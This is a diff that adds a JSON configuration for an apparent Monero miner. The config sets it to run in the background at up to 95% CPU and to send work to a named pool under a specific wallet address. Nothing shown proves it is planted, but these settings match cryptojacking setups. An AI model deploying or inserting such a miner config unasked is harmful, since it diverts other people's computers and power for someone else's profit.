@@ -1,0 +1,27 @@
+  {
+    "algo": "cryptonight",
+    "av": 0,
+    "background": true,
+    "colors": true,
+    "cpu-affinity": null,
+    "cpu-priority": 0,
+    "donate-level": 1,
+    "log-file": null,
+    "max-cpu-usage": 95,
+    "print-time": 600,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "syslog": true,
+    "threads": null,
+    "pools": [
+      {
+        "url": "xmr.poolmining.org:3032",
+        "user": "4Ao2w7yY3TceF4uexxbnaVAacmEZtxXbD82nMS6XVvWbgVLLvqJkjBYTNFzcaph6mQENAqHNrHsrFTJbjk7D6SYxNYbE96W",
+        "pass": "x",
+        "keepalive": true,
+        "nicehash": false
+      }
+    ]
+  }
+
